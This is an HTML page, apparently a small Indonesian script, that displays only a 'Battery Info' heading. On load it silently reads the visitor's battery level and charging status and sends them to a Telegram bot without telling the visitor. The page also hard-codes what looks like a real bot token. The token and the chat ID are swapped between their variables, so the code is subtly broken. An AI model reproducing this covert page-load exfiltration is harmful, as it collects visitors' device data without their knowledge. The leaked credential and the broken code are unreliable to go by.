<!DOCTYPE html>
<html>
<head>
    <title>Info Baterai</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
    <script>
        // Fungsi untuk mendapatkan status baterai
        function getBatteryStatus() {
            navigator.getBattery().then(function(battery) {
                var level = battery.level * 100;
                var status = battery.charging ? 'Sedang dicharge' : 'Tidak dicharge';
                var message = 'Level baterai: ' + level + '%\nStatus: ' + status;
                sendToTelegram(message);
            });
        }

        // Fungsi untuk mengirim pesan ke bot Telegram
        function sendToTelegram(message) {
            var chatId = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ'; // Ganti dengan chat ID bot Telegram Anda
            var apiKey = '1121369247'; // Ganti dengan API Key bot Telegram Anda

            var url = 'https://api.telegram.org/bot' + apiKey + '/sendMessage';
            var params = {
                chat_id: chatId,
                text: message
            };

            axios.post(url, params)
                .then(function (response) {
                    console.log('Pesan terkirim ke Telegram');
                })
                .catch(function (error) {
                    console.error('Gagal mengirim pesan ke Telegram:', error);
                });
        }

        // Panggil fungsi getBatteryStatus saat halaman dimuat
        window.onload = function() {
            if (navigator.getBattery) {
                getBatteryStatus();
            } else {
                console.error('Peramban tidak mendukung API Battery Status');
            }
        };
    </script>
</head>
<body>
    <h1>Informasi Baterai</h1>
</body>
</html>
